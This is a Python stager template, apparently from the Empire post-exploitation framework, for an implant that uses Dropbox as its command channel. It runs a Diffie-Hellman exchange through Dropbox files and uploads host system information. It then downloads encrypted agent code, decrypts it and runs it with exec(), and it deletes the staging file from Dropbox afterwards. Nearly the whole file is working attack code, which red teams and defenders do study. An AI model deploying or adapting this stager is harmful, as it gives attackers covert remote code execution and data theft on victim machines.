#!/usr/bin/env python3

"""
This file is a Jinja2 template.
    Variables:
        staging_folder
        poll_interval
        staging_key
        profile
        api_token
"""

import random
import string
import time

{% include 'common/rc4.py' %}
{% include 'common/aes.py' %}
{% include 'common/diffiehellman.py' %}
{% include 'common/get_sysinfo.py' %}
{% include 'dropbox/comms.py' %}

class Stage:
    def __init__(self):
        self.staging_key = b'{{ staging_key }}'
        self.profile = '{{ profile }}'
        self.staging_folder = '{{ staging_folder }}'
        self.taskings_folder = '{{ taskings_folder }}'
        self.api_token = '{{ api_token }}'
        self.results_folder = '{{ results_folder }}'
        self.poll_interval = int('{{ poll_interval }}')
        self.server='https://content.dropboxapi.com/2/files/download'
        self.session_id = self.generate_session_id()
        self.headers = self.initialize_headers(self.profile)
        self.packet_handler = ExtendedPacketHandler(None, staging_key=self.staging_key, session_id=self.session_id, server=self.server, headers=self.headers, taskings_folder=self.taskings_folder, results_folder=self.results_folder)

    @staticmethod
    def generate_session_id():
        return b''.join(random.choice(string.ascii_uppercase + string.digits).encode('UTF-8') for _ in range(8))

    def initialize_headers(self, profile):
        parts = profile.split('|')
        user_agent = parts[1]
        headers_raw = parts[2:]
        headers = {'User-Agent': user_agent}
        for header_raw in headers_raw:
            try:
                header_key, header_value = header_raw.split(":")
                headers[header_key] = header_value
            except Exception:
                pass
        headers['Authorization'] = "Bearer %s" % (self.api_token)
        headers['Content-Type'] = "application/octet-stream"
        return headers

    def execute(self):
        # Diffie-Hellman Key Exchange
        client_pub = DiffieHellman()
        public_key = str(client_pub.publicKey).encode('UTF-8')
        hmac_data = aes_encrypt_then_hmac(self.staging_key, public_key)

        # Build and Send Routing Packet
        routing_packet = self.packet_handler.build_routing_packet(staging_key=self.staging_key, session_id=self.session_id, meta=2, enc_data=hmac_data)
        try:
            response = self.packet_handler.post_message("https://content.dropboxapi.com/2/files/upload", routing_packet)
        except Exception as e:
            print("Error 1:)")
            print(e)
            exit()

        # (urllib2.urlopen(urllib2.Request(uri, data, headers))).read()
        time.sleep(self.poll_interval * 2)
        try:
            del self.headers['Content-Type']
            self.headers['Dropbox-API-Arg'] = "{\"path\":\"%s/%s_2.txt\"}" % (self.staging_folder, self.session_id)
            raw = self.packet_handler.post_message("https://content.dropboxapi.com/2/files/download", data=None)
        except Exception as e:
            print("Error 2:)")
            print(e)
        # decrypt the server's public key and the server nonce
        packet = aes_decrypt_and_verify(self.staging_key, raw)
        nonce, server_pub = packet[0:16], int(packet[16:])

        # calculate the shared secret
        client_pub.genKey(server_pub)
        self.key = client_pub.key
        self.packet_handler.key = self.key

        # step 5 -> client POSTs HMAC(AESs([nonce+1]|sysinfo)
        hmac_data = aes_encrypt_then_hmac(self.key, get_sysinfo(nonce=str(int(nonce) + 1)).encode('UTF-8'))

        # RC4 routing packet:
        #   sessionID = sessionID
        #   language = PYTHON (2)
        #   meta = STAGE2 (3)
        #   extra = 0
        #   length = len(length)
        routing_packet = self.packet_handler.build_routing_packet(staging_key=self.staging_key, session_id=self.session_id, meta=3, enc_data=hmac_data)
        self.headers['Dropbox-API-Arg'] = "{\"path\":\"%s/%s_3.txt\"}" % (self.staging_folder, self.session_id)
        self.headers['Content-Type'] = "application/octet-stream"
        time.sleep(self.poll_interval * 2)
        response = self.packet_handler.post_message("https://content.dropboxapi.com/2/files/upload", routing_packet)

        time.sleep(self.poll_interval * 2)
        self.headers['Dropbox-API-Arg'] = "{\"path\":\"%s/%s_4.txt\"}" % (self.staging_folder, self.session_id)
        del self.headers['Content-Type']
        raw = self.packet_handler.post_message("https://content.dropboxapi.com/2/files/download", data=None)

        time.sleep(self.poll_interval)
        del self.headers['Dropbox-API-Arg']
        self.headers['Content-Type'] = "application/json"
        data_string = "{\"path\":\"%s/%s_4.txt\"}" % (self.staging_folder, self.session_id)
        response = self.packet_handler.post_message("https://api.dropboxapi.com/2/files/delete_v2", data=data_string)

        # step 6 -> server sends HMAC(AES)
        agent_code = aes_decrypt_and_verify(self.key, raw)
        exec(agent_code, globals())
        agent = MainAgent(packet_handler=self.packet_handler, profile=self.profile, server=self.server,
                          session_id=self.session_id, kill_date=self.kill_date, working_hours=self.working_hours)
        self.packet_handler.agent = agent
        agent.run()

# Initialize and Execute Agent
stage = Stage()
stage.execute()
